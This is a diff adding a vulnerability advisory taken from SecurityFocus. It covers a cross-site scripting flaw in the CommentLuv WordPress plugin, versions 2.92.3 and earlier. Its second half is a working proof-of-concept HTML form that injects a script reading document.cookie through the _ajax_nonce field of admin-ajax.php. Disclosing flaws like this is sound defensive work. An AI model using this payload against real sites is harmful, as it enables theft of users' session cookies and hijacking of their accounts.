@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/57771/info
+
+The CommentLuv plugin for WordPress is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input. 
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+CommentLuv versions 2.92.3 and prior are vulnerable.
+
+<form action="http://www.example.com/wp-admin/admin-ajax.php" method="post" name="askform">
+<input type="hidden" name="action" value="cl_ajax" />
+<input type="hidden" name="do" value="fetch" />
+<input type="hidden" name="url" value="1" />
+<input type="hidden" name="_ajax_nonce" value='<script>alert(document.cookie);</script>'/>
+<input type="submit" id="btn">
+</form>
